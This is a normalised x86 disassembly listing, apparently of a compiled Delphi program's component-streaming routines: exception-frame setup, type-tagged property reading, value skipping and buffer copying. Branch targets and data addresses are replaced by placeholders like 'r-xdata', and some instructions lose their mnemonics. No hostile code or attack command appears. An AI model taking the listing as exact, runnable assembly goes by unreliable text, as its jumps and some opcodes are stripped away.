mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_43f4b8
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_43c264
mov esp ebp
pop ebp
retn
sub_440f64
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
xor eax eax
push ebp
push sub_441152
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43fff8
mov [ ebp - 0x11 ] al
xor eax eax
mov al [ ebp - 0x11 ]
cmp eax 0x12
ja r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447ad8
call sub_44c7a8
jmp [ eax * 4 + jump_table_440fa1 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_441940
cmp al 0xd
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_440a78
mov [ ebp - 0x8 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_440a78
mov [ ebp - 0x8 ] ax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_440a78
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_440844
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_44088c
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4408d4
fistp [ ebp - 0x8 ]
fwait
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_440924
fstp [ ebp - 0x8 ]
fwait
jmp r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_44187c
mov edx [ ebp - 0x18 ]
lea eax [ ebp - 0x10 ]
call sub_44db34
jmp r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4418ec
mov edx [ ebp - 0x1c ]
lea eax [ ebp - 0x10 ]
call sub_44db74
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_441940
cmp al 0x9
sete al
neg al
sbb eax eax
mov [ ebp - 0x8 ] ax
jmp r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ rw-data ]
call sub_44d7f0
jmp r-xdata
lea eax [ ebp - 0x10 ]
call sub_44d7ac
jmp r-xdata
xor eax eax
mov al [ ebp - 0x11 ]
mov ax [ eax * 4 + rw-data ]
mov [ ebp - 0x10 ] ax
lea ecx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_4055ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441159
lea eax [ ebp - 0x1c ]
call sub_44d0c8
lea eax [ ebp - 0x18 ]
call sub_44cae0
lea eax [ ebp - 0x10 ]
call sub_44dba8
retn
sub_441160
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
xor ebx ebx
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4413f5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
movzx eax [ eax ]
cmp eax 0x10
ja r-xdata
mov eax [ rw-data ]
call sub_43fa80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4413fc
lea eax [ ebp - 0x2c ]
mov edx 0x5
call sub_44cb04
retn
jmp [ eax * 4 + jump_table_4411c2 ]
mov eax [ ebp - 0x4 ]
call sub_43fff8
cmp al 0x7
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_4400f4
xor ecx ecx
mov cl al
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4052dc
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_44096c
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x10 ]
call sub_43fac0
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4052dc
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_440844
add esp 0xfffffff4
fstp [ esp ]
fwait
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_405538
jmp r-xdata
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_44187c
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4054e0
jmp r-xdata
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_441738
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4052dc
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_43fff8
sub al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43fff8
cmp al 0xd
jne r-xdata
push ebp
call sub_440f64
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_440ae8
push edx
push eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_405664
mov eax [ ebp - 0x4 ]
call sub_440a78
mov ecx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4052dc
jmp r-xdata
push ebp
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_44096c
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_440ed0
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_441940
xor ecx ecx
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_4052dc
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
call sub_44096c
mov ecx [ ebp - 0x2c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_441940
mov ecx rw-data
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_40562c
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_441940
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_405268
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_44017c
jmp r-xdata
jmp r-xdata
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_40562c
jmp r-xdata
push ebp
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_44096c
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
call sub_440f1c
pop ecx
jmp r-xdata
sub_441404
push ebp
mov ebp esp
add esp 0xffffffe4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x8 ]
call sub_44cae0
cmp [ rw-data ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_44cb34
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
call [ rw-data ]
test eax eax
jne r-xdata
inc [ ebp - 0xc ]
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x0
lea edx [ ebp - 0x1c ]
mov ecx 0x1
mov eax r-xdata
call sub_446fac
sub_441484
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x2c ] ecx
mov [ ebp - 0x30 ] ecx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x24 ] ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_441727
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_441800
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
call sub_448ef8
xor eax eax
push ebp
push sub_441705
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push j_sub_44c4bc#9
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x11 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_441834
mov eax [ ebp - 0xc ]
test [ eax + 0x20 ] 0x10
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
call sub_441834
mov eax [ ebp - 0x1c ]
call sub_43b97c
xor ecx ecx
mov dl 0x1
call [ eax + 0x2c ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
call sub_441834
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
or [ eax + 0x20 ] 0x1
mov eax [ ebp - 0xc ]
or [ eax + 0x20 ] 0x2
push ebp
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_441834
mov eax [ ebp - 0x30 ]
lea edx [ ebp - 0x2c ]
call sub_441404
pop ecx
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_441834
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x18 ] edx
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x1c ] edx
call sub_401140
cmp [ eax ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_44c040
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
call sub_401140
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x20 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
or [ eax + 0x20 ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
and [ eax + 0x20 ] 0xfffd
call sub_401140
cmp [ eax ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_43c264
xor eax eax
push ebp
push sub_4416b0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_43c504
test eax eax
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4416b7
call sub_401140
cmp [ eax ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x34 ] edx
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
call sub_44c070
inc eax
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x10 ]
call sub_43c464
mov edx [ eax ]
call [ edx + 0xc ]
inc [ ebp - 0x10 ]
dec [ ebp - 0x18 ]
jne r-xdata
sub_4416b7
call sub_43f730
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44170c
mov eax [ rw-data ]
call sub_448f68
retn
sub_4416cb
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_43f930
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
call sub_44c7c4
call sub_44c818
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44170c
mov eax [ rw-data ]
call sub_448f68
retn
mov eax [ ebp - 0xc ]
call sub_44c070
sub_441738
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4417ec
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push j_sub_44c4bc#8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_441940
cmp al 0xb
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_40516c
mov eax [ eax + 0x1 ]
mov eax [ eax ]
mov [ ebp - 0x10 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
call sub_43faa0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
call sub_43fac0
cmp eax 0x1f
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4417f3
lea eax [ ebp - 0x14 ]
call sub_44cae0
retn
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_441834
cmp [ ebp - 0x14 ] 0x0
je r-xdata
bts [ ebp - 0xc ] eax
jmp r-xdata
sub_441800
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x8 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_440034
mov eax [ ebp - 0x8 ]
cmp eax [ rw-data ]
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_43fa80
sub_441834
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x9 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
call sub_440034
xor ecx ecx
mov cl [ ebp - 0x9 ]
mov eax [ ebp - 0x8 ]
xor edx edx
call sub_44cbc8
mov eax [ ebp - 0x8 ]
call sub_44cf30
mov edx eax
xor ecx ecx
mov cl [ ebp - 0x9 ]
mov eax [ ebp - 0x4 ]
call sub_440034
mov esp ebp
pop ebp
retn
sub_44187c
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_441940
sub al 0x6
je r-xdata
lea edx [ ebp - 0xc ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
call sub_440034
jmp r-xdata
sub al 0x6
je r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0xc ]
xor edx edx
call sub_44cbc8
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_440034
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_440034
jmp r-xdata
jmp r-xdata
call sub_43faa0
sub_4418ec
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_441940
cmp al 0x12
je r-xdata
lea edx [ ebp - 0xc ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
call sub_440034
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
call sub_44d204
mov ecx [ ebp - 0xc ]
add ecx ecx
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
mov eax [ ebp - 0x4 ]
call sub_440034
mov esp ebp
pop ebp
retn
call sub_43faa0
sub_441940
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x5 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
call sub_440034
mov al [ ebp - 0x5 ]
pop ecx
pop ecx
pop ebp
retn
sub_441960
push ebp
mov ebp esp
add esp 0xfffffff8
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4419a3
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_441834
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4419aa
lea eax [ ebp - 0x8 ]
call sub_44cae0
retn
sub_4419b0
push ebp
mov ebp esp
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43fc8c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_441ad8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_440b44
pop ebp
retn
sub_4419dc
push ebp
mov ebp esp
add esp 0xfffffefc
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x4 ] 0x100
jle r-xdata
lea edx [ ebp - 0x104 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x4 ]
call sub_440034
xor eax eax
mov [ ebp - 0x4 ] eax
lea edx [ ebp - 0x104 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x100
call sub_440034
sub [ ebp - 0x4 ] 0x100
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jg r-xdata
sub_441a3c
push ebp
mov ebp esp
push ecx
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_440034
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_4419dc
pop ecx
pop ecx
pop ebp
retn
sub_441a64
push ebp
mov ebp esp
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43fc8c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43fff8
add al 0xfe
sub al 0x3
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_440b44
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
mov eax 0x1
call sub_4419dc
pop ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_441ad8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43fc8c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_441c40
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_440b44
sub_441ad8
push ebp
mov ebp esp
add esp 0xfffffff8
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_441c35
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_441940
and eax 0x7f
cmp eax 0x13
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441c3c
lea eax [ ebp - 0x8 ]
call sub_44cae0
retn
jmp [ eax * 4 + jump_table_441b0f ]
push ebp
call sub_4419b0
pop ecx
jmp r-xdata
push ebp
mov eax 0x1
call sub_4419dc
pop ecx
jmp r-xdata
push ebp
mov eax 0x2
call sub_4419dc
pop ecx
jmp r-xdata
push ebp
mov eax 0x4
call sub_4419dc
pop ecx
jmp r-xdata
push ebp
mov eax 0xa
call sub_4419dc
pop ecx
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_441834
jmp r-xdata
push ebp
call sub_441a3c
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_441960
jmp r-xdata
push ebp
call sub_441a3c
pop ecx
jmp r-xdata
push ebp
call sub_441a64
pop ecx
jmp r-xdata
push ebp
mov eax 0x4
call sub_4419dc
pop ecx
jmp r-xdata
push ebp
mov eax 0x8
call sub_4419dc
pop ecx
jmp r-xdata
push ebp
mov eax 0x8
call sub_4419dc
pop ecx
jmp r-xdata
push ebp
call sub_441a3c
pop ecx
jmp r-xdata
push ebp
mov eax 0x8
call sub_4419dc
pop ecx
sub_441c40
push ebp
mov ebp esp
add esp 0xfffffff8
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_441c85
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_441834
mov eax [ ebp - 0x4 ]
call sub_441ad8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441c8c
lea eax [ ebp - 0x8 ]
call sub_44cae0
retn
sub_441c90
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_441d36
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_43fc8c
test al al
je r-xdata
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x6 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
lea edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_441834
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_441834
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_441c40
mov eax [ ebp - 0x4 ]
call sub_440b44
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_43fc8c
test al al
je r-xdata
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_441c90
mov eax [ ebp - 0x4 ]
call sub_440b44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441d3d
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_44cb04
retn
sub_441d44
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_441dfb
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_44cb78
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_4428c4
mov [ ebp - 0x10 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_441e02
lea eax [ ebp - 0x14 ]
call sub_44cae0
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x52 ] 0x0
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov ebx [ ebp - 0x4 ]
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
lea eax [ ebp - 0x1c ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447b20
call sub_44c7a8
sub_441e0c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov ecx [ ebp - 0x8 ]
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_441e38
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x42 ] 0x0
je r-xdata
mov edx [ ebp - 0xc ]
mov edx [ edx ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
push eax
mov ebx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
sub_441e78
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x18 ]
call sub_43b9a8
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x62 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
lea eax [ ebp - 0xc ]
push eax
mov ebx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x18 ]
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_43b84c
mov edx [ r-xdata ]
mov eax [ ebp - 0xc ]
call sub_44c27c
test al al
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
call sub_43b9a8
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
pop ebx
mov esp ebp
pop ebp
retn
sub_441f0c
push esi
push edi
push ebx
mov esi edx
mov ebx ecx
mov edi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ edi + 0xc ]
sub ecx [ edi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax edi
call sub_441f58
mov ecx [ edi + 0xc ]
sub ebx ecx
push edi
mov eax [ edi + 0x8 ]
add eax [ edi + 0x10 ]
add [ edi + 0x10 ] ecx
mov edi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
mov ecx ebx
sub_441f58
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_43eb60
mov eax [ ebp - 0x4 ]
xor edx edx
